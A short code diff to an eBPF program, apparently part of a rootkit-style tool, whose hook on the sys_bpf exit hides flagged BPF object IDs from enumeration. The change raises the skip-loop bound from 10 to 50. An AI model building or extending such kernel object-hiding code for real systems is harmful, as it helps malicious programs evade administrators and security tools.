@@ -2,6 +2,8 @@
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_tracing.h>
 
+#define BPF_OBJECT_ITERATION_BOUND 50
+
 /**
  * @brief Hook sys_bpf exit point attempting to filter out bpf entries.
  *
@@ -32,7 +34,7 @@ int BPF_PROG(hide_bpf_objects, struct pt_regs *regs, long ret) {
             return 0;
 
         /* Doing this to prevent returing 0 and making bpf syscall loop */
-        for (int i = 0; i < 10; i++) {
+        for (int i = 0; i < BPF_OBJECT_ITERATION_BOUND; i++) {
             u8 *is_hidden = bpf_map_lookup_elem(&hide_bpf_ids_map, &next_id);
             if (is_hidden && *is_hidden == 1) {
                 next_id++; /* Move to the next candidate ID */
